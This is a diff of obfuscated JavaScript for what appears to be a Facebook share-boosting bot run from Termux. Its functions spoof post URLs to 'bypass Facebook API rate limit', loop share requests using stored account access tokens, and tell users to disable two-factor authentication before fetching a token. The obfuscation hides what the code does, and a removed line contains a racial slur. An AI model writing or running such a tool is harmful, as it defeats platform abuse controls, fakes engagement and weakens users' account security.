+                    if (V['mDkEB'](V[hU(0x265)], V[hU(0x34d)])) {
+                        if (V[hU(0x379)](M[hU(0x247)](), ''))
+                            return V['ozsZL'](L, hU(0x413));
+                        if (!/^\d+$/[hU(0x389)](f))
+                            return V[hU(0x240)](x, hU(0x302));
+                        H = o(E);
+                        if (V[hU(0x2c6)](v, -0x44 * 0x41 + -0x4bb + 0x15ff * 0x1) || V['kaWUB'](T, -0x2 * -0x10ab + 0x25 * 0x6f + -0x59 * 0x8e))
+                            return V[hU(0x240)](P, hU(0x2bd));
+                        return !![];
+                    } else
+                        return console[hU(0x38c)](V[hU(0x42a)](V[hU(0x337)](V[hU(0x1c8)](getTimeStamp), error), hU(0x1d3) + U['response'][hU(0x246)] + hU(0x2ee))), await V[hU(0x2ab)](delay, 0x1d4f + 0x51a + -0xee1 * 0x1), { 'retry': !![] };
+                } else {
+                    if (U[hU(0x2ce)]?.[hU(0x1ef)]?.[hU(0x41e)]) {
+                        if (V['ldURC'](V[hU(0x250)], V['gvXfG']))
+                            return N + V['clJct'];
                         else {
-                            if (w[aa(0x2a2)](w[aa(0x358)], w[aa(0x358)]))
-                                console['log'](w[aa(0x3cd)](getTimeStamp) + error + Q[aa(0x35d)]);
-                            else
-                                return w[aa(0x2d8)](n, w[aa(0x237)]);
+                            const Q = U[hU(0x2ce)][hU(0x1ef)][hU(0x41e)];
+                            if (V[hU(0x37e)](Q['code'], 0x1a17 * -0x1 + -0x223e + 0x1e2b * 0x2) || V[hU(0x37e)](Q[hU(0x331)], 0x2 * -0x104 + 0x2653 * -0x1 + 0x285d)) {
+                                if (V['hpKvl'](V[hU(0x350)], V['rRLBx']))
+                                    return console[hU(0x38c)](V['SkvMS'](V[hU(0x2db)](V[hU(0x281)](getTimeStamp), error), 'Unexpected\x20Error')), { 'retry': !![] };
+                                else
+                                    B[hU(0x38c)](V[hU(0x225)](V[hU(0x225)](V['qkiYS'](g), C), 'Two-factor\x20authentication\x20is\x20enabled.\x20Please\x20disable\x20it\x20before\x20getting\x20token'));
+                            }
+                            console['log'](Q);
                         }
+                    } else {
+                        if (V[hU(0x224)](U[hU(0x331)], hU(0x320))) {
+                            if (V[hU(0x3f5)](V[hU(0x32e)], V[hU(0x32e)]))
+                                return console['log'](V[hU(0x236)](V['SkvMS'](V[hU(0x28b)](getTimeStamp), error), hU(0x2c5) + U[hU(0x331)] + hU(0x259) + U[hU(0x38e)])), { 'retry': !![] };
+                            else {
+                                if (C[hU(0x247)]() === '')
+                                    return V[hU(0x1ed)](M, hU(0x255));
+                                if (!t[hU(0x25c)](V[hU(0x214)]) && !F[hU(0x25c)](V[hU(0x3ce)]))
+                                    return V[hU(0x225)](d, hU(0x36d));
+                                return !![];
+                            }
+                        } else
+                            console[hU(0x38c)](V[hU(0x337)](V['BqpUD'](V[hU(0x28b)](getTimeStamp), error), U[hU(0x38e)]));
                     }
                 }
             }
         }
     }
     try {
-        if (w[aa(0x1c3)] !== aa(0x3e4)) {
-            w[aa(0x1cc)](n, w[aa(0x32f)], { 'stdio': w['JzgnN'] });
-            return;
-        } else
-            Zr[aa(0x212)](sharelogf, getTime() + '\x20' + n + aa(0x2f6) + Zz[aa(0x37c)](Q[aa(0x251)] ? Q[aa(0x251)][aa(0x377)] : Q[aa(0x35d)], null, -0x16f3 * 0x1 + 0x1cf1 * 0x1 + -0x5fc) + '\x0a', {
-                'encoding': w[aa(0x2ff)],
-                'flag': 'a'
-            });
-    } catch (H) {
-        console[aa(0x1b8)](w['gbyBN'](w[aa(0x3cd)](getTimeStamp), info) + H[aa(0x35d)]);
+        mR[hU(0x269)](sharelogf, V['ZphuY'](getTime) + '\x20' + N + hU(0x40e) + mn[hU(0x2d1)](U['response'] ? U['response']['data'] : U[hU(0x38e)], null, 0x2214 + 0x6 * 0x5c9 + -0x8e * 0x7c) + '\x0a', {
+            'encoding': 'utf8',
+            'flag': 'a'
+        });
+    } catch (J) {
+        console[hU(0x38c)](V['cBncZ'](V[hU(0x28b)](getTimeStamp), info) + J[hU(0x38e)]);
     }
-    return w[aa(0x3cd)](isTermuxAPIInstalled) && (w[aa(0x2a2)](w[aa(0x408)], w['ALOdj']) ? w[aa(0x2b5)](execSync, w[aa(0x318)]) : i[aa(0x1b8)](H + '(' + W + ')' + t + '\x20' + B[w[aa(0x2e1)](V, -0xad0 + -0x25 * 0xe7 + 0x17 * 0x1ec)])), { 'retry': ![] };
+    return isTermuxAPIInstalled() && V[hU(0x343)](execSync, hU(0x221)), { 'retry': ![] };
 }
-function spoofPostUrl(Q) {
-    const aQ = ZC, n = {
-            'UWtUd': function (b, g) {
-                return b * g;
+function spoofPostUrl(U) {
+    const hN = mz, N = {
+            'bldkm': function (B) {
+                return B();
             },
-            'PzIeQ': function (b, g) {
-                return b + g;
+            'xQuQs': function (B, g) {
+                return B === g;
             },
-            'bcGbu': function (b) {
-                return b();
+            'vdtfr': 'pldRi',
+            'qRNHq': function (B, g) {
+                return B * g;
             },
-            'NRHBD': function (b, g) {
-                return b + g;
+            'SbjjB': function (B, g) {
+                return B * g;
             },
-            'aDbFM': function (b, g) {
-                return b + g;
+            'cOYim': function (B, g) {
+                return B + g;
             },
-            'ZgGZF': function (b, g) {
-                return b + g;
+            'jZwbv': function (B, g) {
+                return B + g;
             },
-            'RfIeZ': aQ(0x297),
-            'aeHEj': function (b, g) {
-                return b(g);
+            'GeTTy': function (B) {
+                return B();
             },
-            'ThBRf': function (b, g) {
-                return b <= g;
+            'KYPpf': 'fbid',
+            'OzpZP': hN(0x28c),
+            'zmcKL': hN(0x3b2),
+            'bfPgt': function (B, g) {
+                return B - g;
             },
-            'txuYS': function (b, g) {
-                return b > g;
+            'UNtcI': function (B, g) {
+                return B(g);
             },
-            'gQPxH': function (b, g) {
-                return b + g;
+            'mKvcG': function (B, g) {
+                return B(g);
             },
-            'aGjbQ': aQ(0x364),
-            'kRLre': aQ(0x2df),
-            'QljjS': aQ(0x252),
-            'rrcbq': function (b, g) {
-                return b !== g;
+            'wSASV': function (B, g) {
+                return B + g;
             },
-            'vslGr': aQ(0x2ac),
-            'qRXMS': function (b, g) {
-                return b - g;
+            'vDjcR': function (B, g) {
+                return B + g;
             },
-            'kHWpS': function (b, g) {
-                return b(g);
-            },
-            'aJryY': function (b, g) {
-                return b(g);
+            'ZPQsY': function (B) {
+                return B();
             }
-        }, w = b => {
-            const an = aQ, g = 'a.' + Math[an(0x218)](n[an(0x341)](Date['now'](), Math['random']()))[an(0x2d2)](), Y = n['PzIeQ'](Math[an(0x218)](n[an(0x341)](Math[an(0x29a)](), 0x1fa7 + 0x562 * 0x1 + -0x2505)), -0x4 * -0xa3 + 0x1 * 0x1655 + -0x18e0);
-            return console[an(0x1b8)](n[an(0x1e8)](n[an(0x3f0)](getTimeStamp) + info, an(0x2b3))), console[an(0x1b8)](n[an(0x1e8)](getTimeStamp(), info) + (an(0x320) + yellow + b)), console[an(0x1b8)](n['NRHBD'](n[an(0x209)](n[an(0x3f0)](getTimeStamp), info), 'Generated\x20Set:\x20' + yellow + g + white + an(0x294) + yellow + Y)), an(0x33b) + b + an(0x1dd) + g + '&type=' + Y + an(0x322);
+        }, V = B => {
+            const hV = hN;
+            if (N['xQuQs'](hV(0x3c0), N[hV(0x386)]))
+                N[hV(0x1cd)](N);
+            else {
+                const C = 'a.' + Math[hV(0x258)](N[hV(0x3de)](Date['now'](), Math[hV(0x22c)]()))[hV(0x38d)](), Q = Math[hV(0x258)](N[hV(0x2ff)](Math[hV(0x22c)](), -0xeaa * 0x2 + 0x1947 + -0x3 * -0x15b)) + (-0x162d + 0x30b * -0xb + 0x1 * 0x37a7);
+                return console[hV(0x38c)](N[hV(0x301)](N[hV(0x301)](N[hV(0x1cd)](getTimeStamp), info), 'Bypassing\x20Facebook\x20API\x20rate\x20limit...')), console[hV(0x38c)](N[hV(0x1e6)](N[hV(0x370)](getTimeStamp), info) + ('Extracted\x20FBID:\x20' + yellow + B)), console[hV(0x38c)](N[hV(0x301)](N[hV(0x1e6)](getTimeStamp(), info), hV(0x2e4) + yellow + C + white + ',\x20Type:\x20' + yellow + Q)), hV(0x27a) + B + '&set=' + C + hV(0x2c9) + Q + hV(0x2b6);
+            }
         };
-    if (!Q[aQ(0x1af)](n[aQ(0x23f)]) && !Q[aQ(0x1af)](n[aQ(0x32d)])) {
-        if (n[aQ(0x2b2)](n[aQ(0x230)], n[aQ(0x230)])) {
-            if (V[aQ(0x34c)]() === '')
-                return n[aQ(0x39c)](f, n[aQ(0x203)]);
-            if (!/^\d+$/[aQ(0x2ee)](c))
-                return n[aQ(0x1e8)](E, aQ(0x3c2));
-            P = n[aQ(0x40e)](m, k);
-            if (n[aQ(0x204)](X, -0x1 * -0xc2f + 0x1d97 + -0x29c6) || n[aQ(0x35c)](M, u[aQ(0x3ce)]))
-                return n[aQ(0x27e)](O, n[aQ(0x370)]);
-            return !![];
-        } else {
-            Q = new URL(Q);
-            const g = Q[aQ(0x2cd)]['split']('/')[aQ(0x247)](Boolean), Y = g[n[aQ(0x1ef)](g[aQ(0x3ce)], -0x1 * -0xe6b + -0xc11 + -0x259)];
-            return n[aQ(0x1f3)](w, Y);
+    if (!U[hN(0x27f)](N[hN(0x3c7)]) && !U[hN(0x27f)](N[hN(0x1dd)])) {
+        if (N['zmcKL'] !== hN(0x3b2))
+            return N[hN(0x301)](N, hN(0x255));
+        else {
+            U = new URL(U);
+            const g = U[hN(0x346)][hN(0x355)]('/')[hN(0x303)](Boolean), C = g[N[hN(0x3f7)](g[hN(0x2e1)], -0x1d * -0x3b + 0x20 * -0x50 + 0x352)];
+            return N[hN(0x35a)](V, C);
         }
     } else {
-        if (Q['includes']('fbid')) {
-            Q = new URL(Q);
-            const i = Q[aQ(0x1f1)][aQ(0x2b8)](n[aQ(0x23f)]);
-            return n['aJryY'](w, i);
+        if (U['includes'](hN(0x385))) {
+            U = new URL(U);
+            const Q = U['searchParams']['get'](N[hN(0x3c7)]);
+            return N[hN(0x1eb)](V, Q);
         }
     }
-    return console[aQ(0x1b8)](n['gQPxH'](n['bcGbu'](getTimeStamp) + warn, 'Failed\x20to\x20bypass\x20Facebook\x20API\x20rate\x20limit.\x20Try\x20using\x20Facebook\x20Lite\x20or\x20Chrome\x20to\x20copy\x20the\x20post\x20link.')), Q;
+    return console['log'](N[hN(0x36b)](N['vDjcR'](N[hN(0x422)](getTimeStamp), warn), hN(0x2f4))), U;
 }
-async function shareContent(Q, n, w, b) {
-    const aw = ZC, g = {
-            'tcqFv': function (H, W) {
-                return H + W;
+async function shareContent(U, N, V, B) {
+    const hB = mz, g = {
+            'aIxpa': function (Q, t) {
+                return Q + t;
             },
-            'ZLKua': aw(0x33e),
-            'UBcpL': function (H) {
-                return H();
+            'fxHbF': function (Q, t) {
+                return Q + t;
             },
-            'BTzNR': function (H, W) {
-                return H + W;
+            'NvnFQ': function (Q) {
+                return Q();
             },
-            'fgLAl': function (H, W) {
-                return H + W;
+            'FDlWF': function (Q) {
+                return Q();
             },
-            'CSnUv': function (H) {
-                return H();
+            'IRsGO': function (Q, t) {
+                return Q === t;
             },
-            'SYtEm': function (H, W) {
-                return H(W);
+            'AppQV': 'boolean',
+            'jEFBd': function (Q, t) {
+                return Q !== t;
             },
-            'bFkWi': 'Really\x20Nigga',
-            'gbRQF': function (H, W) {
-                return H === W;
+            'NnUcs': hB(0x216),
+            'KEafu': hB(0x262),
+            'otHeI': hB(0x1d4),
+            'hlmSM': function (Q) {
+                return Q();
             },
-            'JUANm': 'boolean',
-            'yzPbx': function (H, W) {
-                return H <= W;
+            'xrSUU': function (Q, t, F, J) {
+                return Q(t, F, J);
             },
-            'gyYkB': 'jkurC',
-            'jLfMr': aw(0x2f9),
-            'oKhXy': function (H, W) {
-                return H === W;
+            'BIvrG': function (Q, t) {
+                return Q(t);
             },
-            'nFxEL': aw(0x1be),
-            'caKiQ': aw(0x2d3),
-            'LvSOk': function (H, W, t, B) {
-                return H(W, t, B);
+            'IthDl': function (Q, t) {
+                return Q + t;
             },
-            'tirzU': function (H) {
-                return H();
+            'uKHvK': function (Q, t) {
+                return Q + t;
             },
-            'WlsKG': function (H, W) {
-                return H !== W;
+            'RxbZY': function (Q) {
+                return Q();
             },
-            'YOBPH': function (H, W) {
-                return H + W;
+            'OwPTG': function (Q, t) {
+                return Q + t;
             },
-            'QYTGd': aw(0x3be),
-            'iPjQN': function (H, W) {
-                return H >= W;
+            'kcRyg': function (Q) {
+                return Q();
             },
-            'aIXmN': function (H, W) {
-                return H === W;
-            },
-            'ZvFBv': aw(0x1db),
-            'tajoT': aw(0x37b),
-            'KUFFe': function (H, W, t) {
-                return H(W, t);
+            'sOPab': hB(0x310),
+            'frNMt': 'JxEPk',
+            'PXDip': hB(0x3ea),
+            'IgUnU': function (Q, t, F) {
+                return Q(t, F);
             }
         };
-    let Y = -0x463 + -0xa * -0x36a + -0x1dc1;
-    while (g[aw(0x313)](typeof n, g[aw(0x2ca)]) ? !![] : g[aw(0x2a0)](Y, n)) {
-        if (g[aw(0x1da)] !== g[aw(0x3f1)])
-            try {
-                if (g['oKhXy'](g[aw(0x309)], 'GHTnY')) {
-                    headers[g['caKiQ']] = g[aw(0x236)](getRandom);
-                    const H = await g['LvSOk'](sendRequest, g[aw(0x304)](spoofPostUrl, Q), w, headers);
-                    Y += -0x2096 * -0x1 + -0x20 * 0x3d + -0x1 * 0x18f5, total += -0x3 * -0x477 + 0x7 * -0x13d + -0x4b9;
-                    const W = H[aw(0x377)]['id'];
-                    console[aw(0x1b8)](g[aw(0x2f4)](g[aw(0x29d)](g[aw(0x1a9)](getTimeStamp), info), '' + green + Y + (g['WlsKG'](typeof n, g[aw(0x2ca)]) ? '/' + n : '/-') + '\x20' + white + '>\x20' + green + aw(0x231))), console[aw(0x1b8)](g[aw(0x2f4)](g[aw(0x1b9)](getTimeStamp(), info), yellow + 'ID\x20' + white + '>\x20' + green + W)), console[aw(0x1b8)](g[aw(0x2f4)](g['YOBPH'](g['UBcpL'](getTimeStamp), info), yellow + aw(0x1d0) + white + '>\x20' + green + H[aw(0x377)][aw(0x262)]));
-                    if (g[aw(0x3a2)](typeof n, g[aw(0x1ca)]) && g['iPjQN'](Y, n)) {
-                        if (g[aw(0x228)]('bufNo', 'lyvlg'))
-                            g['log'](g[aw(0x1b9)](Y(), Y) + g[aw(0x1d7)]), g[aw(0x236)](H);
-                        else
-                            break;
-                    }
-                } else
-                    Y['token'] = [], H[aw(0x266)] = [], g[aw(0x236)](W), t[aw(0x1b8)](g[aw(0x2f4)](g['fgLAl'](g['CSnUv'](B), V), aw(0x2e7)));
-            } catch (V) {
-                if (g[aw(0x2b9)] === g[aw(0x26e)])
-                    g[aw(0x304)](n, aw(0x2f0));
-                else {
-                    const {retry: c} = await g[aw(0x37a)](handleErrors, V, b);
-                    if (c)
-                        continue;
-                    else
+    let C = 0xbb * 0x23 + 0x1bc0 * 0x1 + -0x3551;
+    while (g['IRsGO'](typeof N, g[hB(0x1d0)]) ? !![] : C <= N) {
+        try {
+            if (g[hB(0x31d)](g[hB(0x208)], g[hB(0x3ff)])) {
+                headers[g[hB(0x33e)]] = g[hB(0x328)](getRandom);
+                const Q = await g[hB(0x233)](sendRequest, g[hB(0x29e)](spoofPostUrl, U), V, headers);
+                C += 0x1497 + -0x1daa + 0x914, total += 0x8c * -0x2d + -0x2636 + 0x3ed3;
+                const t = Q[hB(0x1ef)]['id'];
+                console['log'](g[hB(0x3c3)](g[hB(0x28a)](g[hB(0x309)](getTimeStamp), info), '' + green + C + (g[hB(0x31d)](typeof N, g[hB(0x1d0)]) ? '/' + N : '/-') + '\x20' + white + '>\x20' + green + hB(0x27e))), console[hB(0x38c)](g['aIxpa'](g[hB(0x3a8)](getTimeStamp(), info), yellow + hB(0x3d0) + white + '>\x20' + green + t)), console[hB(0x38c)](g[hB(0x28a)](g[hB(0x3fd)](getTimeStamp) + info, yellow + hB(0x354) + white + '>\x20' + green + Q[hB(0x1ef)][hB(0x215)]));
+                if (g['IRsGO'](typeof N, g[hB(0x1bf)]) && C >= N) {
+                    if (g[hB(0x31d)](g[hB(0x20b)], g['PXDip']))
                         break;
+                    else
+                        C[hB(0x38c)](g[hB(0x29d)](g[hB(0x272)](g['NvnFQ'](Q), t), '(removeToken)\x20Function\x20Error:\x20' + F[hB(0x38e)])), g[hB(0x394)](J);
                 }
-            }
-        else
-            return n + g[aw(0x272)];
+            } else
+                try {
+                    g('termux-open\x20http://t.me/KairuDev');
+                } catch (M) {
+                    Q(hB(0x30d));
+                }
+        } catch (M) {
+            const {retry: d} = await g[hB(0x31f)](handleErrors, M, B);
+            if (d)
+                continue;
+            else
+                break;
+        }
     }
 }
-async function sendReq(Q, n, w, b) {
-    const ab = ZC, g = {
-            'ZBMMG': ab(0x3df),
-            'amjrd': function (Y, i) {
-                return Y !== i;
-            },
-            'HBAmM': 'UFsNW'
-        };
-    typeof n === g[ab(0x342)] ? await shareContent(Q, !![], w, b) : g[ab(0x1de)](g[ab(0x28f)], 'UFsNW') ? n = !![] : await shareContent(Q, n, w, b);
-}
-async function startShare(Q, n, w, b) {
-    const ag = ZC, g = {
-            'EstHT': function (i, H, W, t, B) {
-                return i(H, W, t, B);
-            },
-            'PChTV': function (i, H) {
-                return i + H;
-            },
-            'mXcxM': function (i, H) {
-                return i + H;
-            },
-            'DrMoR': function (i) {
-                return i();
-            },
-            'gprsz': function (i) {
-                return i();
+async function sendReq(U, N, V, B) {
+    const hg = mz, g = {
+            'xYtkU': function (C, Q, t, F, J) {
+                return C(Q, t, F, J);
             }
         };
-    let Y = [g['EstHT'](sendReq, Q, n, w, b)];
-    await Promise[ag(0x238)](Y), console[ag(0x1b8)](g[ag(0x1e0)](g[ag(0x3bd)](g[ag(0x1bc)](getTimeStamp), info), ag(0x292))), console[ag(0x1b8)](g[ag(0x3bd)](g[ag(0x1bc)](getTimeStamp), info) + (ag(0x229) + total)), total = -0x1f54 + -0x1 * -0x109b + 0xeb9, await cont(), await g[ag(0x27f)](main);
+    typeof N === 'boolean' ? await shareContent(U, !![], V, B) : await g[hg(0x411)](shareContent, U, N, V, B);
+}
+async function startShare(U, N, V, B) {
+    const hC = mz, g = {
+            'RXPWm': function (Q, t, F, J, M) {
+                return Q(t, F, J, M);
+            },
+            'frnJR': function (Q, t) {
+                return Q + t;
+            },
+            'UHnIt': function (Q, t) {
+                return Q + t;
+            },
+            'ElOpE': function (Q, t) {
+                return Q + t;
+            },
+            'AtYDD': function (Q) {
+                return Q();
+            },
+            'kXsUN': function (Q) {
+                return Q();
+            }
+        };
+    let C = [g[hC(0x333)](sendReq, U, N, V, B)];
+    await Promise[hC(0x2b1)](C), console[hC(0x38c)](g[hC(0x30f)](g[hC(0x30f)](getTimeStamp(), info), hC(0x299))), console[hC(0x38c)](g[hC(0x25e)](g['ElOpE'](g[hC(0x284)](getTimeStamp), info), 'Shares\x20Total:\x20' + total)), total = 0x19f7 + -0x2 * 0x2b1 + -0x1495, await g[hC(0x293)](cont), await g['kXsUN'](main);
 }
 async function removeToken() {
-    const aY = ZC, Q = {
-            'MurFY': function (n, w) {
-                return n + w;
+    const hQ = mz, U = {
+            'bZWQw': function (N, V) {
+                return N + V;
             },
-            'pfqQX': function (n, w) {
-                return n + w;
+            'OQVmA': function (N, V, B) {
+                return N(V, B);
             },
-            'vVURo': function (n, w) {
-                return n + w;
+            'xRgGX': hQ(0x1d6),
+            'xrxWE': hQ(0x340),
+            'gdOgV': function (N, V) {
+                return N === V;
             },
-            'vuWqB': function (n) {
-                return n();
+            'frqDT': hQ(0x2dd),
+            'xHzBS': hQ(0x400),
+            'JjSxR': function (N, V) {
+                return N(V);
             },
-            'OeBes': 'Local\x20changes\x20detected\x20in\x20index.js.\x20Please\x20commit\x20or\x20stash\x20your\x20changes\x20before\x20updating.',
-            'jWNMY': function (n, w) {
-                return n(w);
+            'ZOrXo': function (N, V) {
+                return N <= V;
             },
-            'bdZjX': function (n, w) {
-                return n(w);
+            'yKiwN': function (N) {
+                return N();
             },
-            'fttSw': function (n, w) {
-                return n <= w;
+            'wZMLt': function (N) {
+                return N();
             },
-            'GmIvg': function (n, w) {
-                return n !== w;
+            'FTCKk': function (N) {
+                return N();
             },
-            'UvlkN': aY(0x317),
-            'UlESR': aY(0x1cb),
-            'MyfhV': function (n, w) {
-                return n + w;
+            'GzHzB': function (N) {
+                return N();
             },
-            'FyzGv': function (n) {
-                return n();
+            'cfjOK': function (N, V) {
+                return N === V;
             },
-            'YHtSh': function (n, w) {
-                return n === w;
+            'KYcqk': hQ(0x283),
+            'wtlvL': function (N) {
+                return N();
             },
-            'RlXAC': function (n, w) {
-                return n === w;
+            'qRVRP': function (N) {
+                return N();
             },
-            'GaJwD': aY(0x1fe),
-            'VQSot': aY(0x373),
-            'WBzjb': function (n, w) {
-                return n !== w;
+            'JPJTF': function (N, V) {
+                return N - V;
             },
-            'axRQy': 'BdsVM',
-            'nBZXT': function (n, w) {
-                return n !== w;
+            'ETtZs': function (N) {
+                return N();
             },
-            'CKykW': 'TDzvb',
-            'kLSBO': function (n, w) {
-                return n - w;
-            },
-            'KyxKb': function (n, w) {
-                return n - w;
-            },
-            'GGsQh': function (n, w) {
-                return n + w;
-            },
-            'hOmoz': function (n) {
-                return n();
-            },
-            'QcDik': function (n, w) {
-                return n === w;
-            },
-            'PdXkh': aY(0x1b3),
-            'XxQUc': aY(0x346),
-            'oXPaw': function (n, w) {
-                return n + w;
-            },
-            'UMoUY': function (n, w) {
-                return n + w;
-            },
-            'bHExu': function (n) {
-                return n();
+            'qHldP': function (N, V) {
+                return N + V;
             }
         };
-    Q[aY(0x267)](setClear);
+    setClear();
     try {
-        await Q[aY(0x239)](animate, banner);
-        if (Q[aY(0x383)](tokens[aY(0x3ce)], -0x25 * 0xc2 + -0x52 + 0x37 * 0x84)) {
-            if (Q[aY(0x242)](Q[aY(0x366)], Q[aY(0x307)])) {
-                console['log'](Q['MyfhV'](getTimeStamp(), info) + 'No\x20Tokens\x20Found.'), await cont(), await Q[aY(0x267)](tokenManagement);
-                return;
-            } else
-                return Q[aY(0x403)](n, 'Invalid\x20Option.\x20Out\x20of\x20Range');
-        }
-        Q[aY(0x274)](logToken), console[aY(0x1b8)]();
-        const {tokenIndex: n} = await inquirer[aY(0x25b)](prompts['removeToken']);
-        if (Q[aY(0x223)](n['toLowerCase'](), 'b')) {
-            if (Q['RlXAC'](Q[aY(0x2ad)], Q[aY(0x1f4)]))
-                g[aY(0x1b8)](Q[aY(0x21c)](Q[aY(0x271)](Y(), i), H[aY(0x251)]));
-            else {
-                await tokenManagement();
+        if (U[hQ(0x204)](U['frqDT'], U[hQ(0x431)]))
+            return U[hQ(0x1c9)](N, hQ(0x302));
+        else {
+            await U['JjSxR'](animate, banner);
+            if (U['ZOrXo'](tokens[hQ(0x2e1)], 0xa3 + -0x2694 + 0x25f1)) {
+                console[hQ(0x38c)](U[hQ(0x1c9)](U[hQ(0x232)](getTimeStamp), info) + hQ(0x22e)), await U['wZMLt'](cont), await tokenManagement();
                 return;
             }
+            U[hQ(0x273)](logToken), console['log']();
+            const {tokenIndex: V} = await inquirer[hQ(0x405)](prompts[hQ(0x1e0)]);
+            if (V[hQ(0x37d)]() === 'b') {
+                await U[hQ(0x263)](tokenManagement);
+                return;
+            }
+            if (U[hQ(0x27c)](V['toLowerCase'](), 'a')) {
+                if (hQ(0x3d7) !== U[hQ(0x360)])
+                    tokenParsed[hQ(0x393)] = [], tokenParsed[hQ(0x366)] = [], U['wtlvL'](updateTokenFile), console[hQ(0x38c)](U[hQ(0x1c9)](U[hQ(0x3bc)](getTimeStamp), info) + hQ(0x421));
+                else {
+                    U[hQ(0x33d)](N, U[hQ(0x3a9)], { 'stdio': U[hQ(0x2bf)] });
+                    return;
+                }
+            } else
+                tokenParsed['token']['splice'](U[hQ(0x32d)](V, -0x8a3 + 0x26de + -0x1e3a), 0x1 * -0x1a4b + -0x1cfa + 0x3746), tokenParsed[hQ(0x366)][hQ(0x3bf)](V - (0x1deb * 0x1 + 0x2143 + -0x3f2d), 0x4 * 0x503 + 0x2083 + -0x348e), U[hQ(0x232)](updateTokenFile), console['log'](U[hQ(0x273)](getTimeStamp) + info + ('(' + V + hQ(0x274)));
+            await cont(), await U[hQ(0x3ed)](tokenManagement);
         }
-        n[aY(0x1ff)]() === 'a' ? Q[aY(0x3e6)](Q[aY(0x1a5)], Q[aY(0x1a5)]) ? Q['vuWqB'](n) : (tokenParsed[aY(0x3b1)] = [], tokenParsed['email'] = [], Q[aY(0x267)](updateTokenFile), console[aY(0x1b8)](Q[aY(0x271)](Q[aY(0x21c)](getTimeStamp(), info), aY(0x2e7)))) : Q[aY(0x3c5)](Q[aY(0x224)], Q[aY(0x224)]) ? (g[aY(0x1b8)](Q[aY(0x271)](Q['vVURo'](Y(), i), Q['OeBes'])), H[aY(0x382)](0x9b8 + 0x12 * 0x22b + -0x30bd)) : (tokenParsed[aY(0x3b1)][aY(0x352)](Q['kLSBO'](n, -0x2f9 * 0x3 + 0x2 * 0xaac + -0xc6c), 0x1 * -0x1da7 + 0x1 * -0x8ad + 0x1 * 0x2655), tokenParsed[aY(0x266)][aY(0x352)](Q[aY(0x3b3)](n, 0x1 * 0x1ac + 0x24d2 * -0x1 + -0x1 * -0x2327), 0x1d71 * -0x1 + -0x1 * 0x4f3 + 0x1 * 0x2265), updateTokenFile(), console['log'](Q[aY(0x403)](Q[aY(0x1d3)](Q[aY(0x380)](getTimeStamp), info), '(' + n + aY(0x1e9)))), await cont(), await tokenManagement();
-    } catch (i) {
-        Q['QcDik'](Q[aY(0x222)], Q[aY(0x315)]) ? Q['jWNMY'](n, aY(0x39a)) : (console[aY(0x1b8)](Q[aY(0x3d8)](Q[aY(0x27a)](Q[aY(0x3f3)](getTimeStamp), error), aY(0x404) + i[aY(0x35d)])), exit());
+    } catch (g) {
+        console['log'](U['qHldP'](U['GzHzB'](getTimeStamp) + error, hQ(0x2a6) + g[hQ(0x38e)])), U[hQ(0x232)](exit);
     }
 }
-function addToken(Q, n) {
-    const ai = ZC, w = {
-            'xxQvp': 'utf8',
-            'qqoiJ': function (b, g) {
-                return b + g;
+function addToken(U, N) {
+    const ht = mz, V = {
+            'YQPgP': function (B, g) {
+                return B !== g;
             },
-            'GiAEK': function (b) {
-                return b();
+            'CUaPf': ht(0x2d5),
+            'pYeHX': function (B) {
+                return B();
             },
-            'jgHXj': function (b, g) {
-                return b !== g;
-            },
-            'BgFsO': ai(0x338),
-            'OAjsQ': function (b, g) {
-                return b + g;
-            },
-            'LyTPl': function (b) {
-                return b();
+            'JPPGU': function (B, g) {
+                return B + g;
             }
         };
     try {
-        if (w[ai(0x2ef)]('XKvFS', w[ai(0x36a)]))
-            tokenParsed['token'][ai(0x40c)](Q), tokenParsed[ai(0x266)][ai(0x40c)](n), updateTokenFile();
-        else
-            try {
-                const g = O[ai(0x1ae)](S, w[ai(0x344)]);
-                d = r[ai(0x3e0)](g), z = J[ai(0x3b1)], h = q[ai(0x266)];
-            } catch (Y) {
-                v[ai(0x1b8)](w['qqoiJ'](w['GiAEK'](C) + R, Y['message'])), w[ai(0x40b)](s);
-            }
+        V['YQPgP'](ht(0x2d5), V[ht(0x2f1)]) ? N() : (tokenParsed[ht(0x393)][ht(0x3a7)](U), tokenParsed[ht(0x366)][ht(0x3a7)](N), V['pYeHX'](updateTokenFile));
     } catch (g) {
-        console[ai(0x1b8)](w[ai(0x3d4)](w['GiAEK'](getTimeStamp), error) + ('(addToken)\x20Function\x20Error:\x20' + g[ai(0x35d)])), w[ai(0x289)](exit);
+        console['log'](V[ht(0x374)](V[ht(0x374)](V[ht(0x401)](getTimeStamp), error), '(addToken)\x20Function\x20Error:\x20' + g[ht(0x38e)])), V[ht(0x401)](exit);
     }
 }
 function updateTokenFile() {
-    const aH = ZC, Q = {
-            'XEaHJ': function (n, w) {
-                return n + w;
+    const hF = mz, U = {
+            'yTpNn': function (N) {
+                return N();
             },
-            'YhWua': function (n, w) {
-                return n === w;
+            'KFyGe': hF(0x1fe),
+            'mBWwg': function (N) {
+                return N();
             },
-            'rokeB': 'zPOHt',
-            'dHKmY': aH(0x22c),
-            'pRCJJ': function (n) {
-                return n();
+            'swgPh': function (N, V) {
+                return N + V;
             },
-            'UuicK': function (n, w) {
-                return n + w;
+            'JjbIa': function (N) {
+                return N();
             }
         };
     try {
-        if (Q['YhWua'](Q[aH(0x3e1)], Q[aH(0x2be)]))
-            return b[aH(0x1b8)](Q[aH(0x3d3)](Q['XEaHJ'](g(), Y), aH(0x27c))), { 'retry': !![] };
-        else
-            Zr[aH(0x212)](tokenfile, JSON[aH(0x37c)](tokenParsed, null, 0x2331 + 0x11 * -0x4f + -0x1df0), 'utf8'), Q[aH(0x201)](updateToken);
-    } catch (w) {
-        console[aH(0x1b8)](Q[aH(0x3ea)](Q[aH(0x3ea)](Q['pRCJJ'](getTimeStamp), error), aH(0x379) + w[aH(0x35d)])), Q['pRCJJ'](exit);
+        hF(0x1fe) !== U[hF(0x2a4)] ? U[hF(0x217)](N) : (mR[hF(0x269)](tokenfile, JSON[hF(0x2d1)](tokenParsed, null, 0x21de + 0x2 * 0x3f5 + 0x14e3 * -0x2), hF(0x2f2)), U[hF(0x375)](updateToken));
+    } catch (V) {
+        console['log'](U[hF(0x361)](U[hF(0x361)](U[hF(0x375)](getTimeStamp), error), '(updateTokenFile)\x20Function\x20Error:\x20' + V['message'])), U[hF(0x2b7)](exit);
     }
 }
 function logToken() {
-    const aW = ZC, Q = {
-            'Yqxkj': function (n, w) {
-                return n + w;
+    const hJ = mz, U = {
+            'lIqHs': function (N, V) {
+                return N <= V;
             },
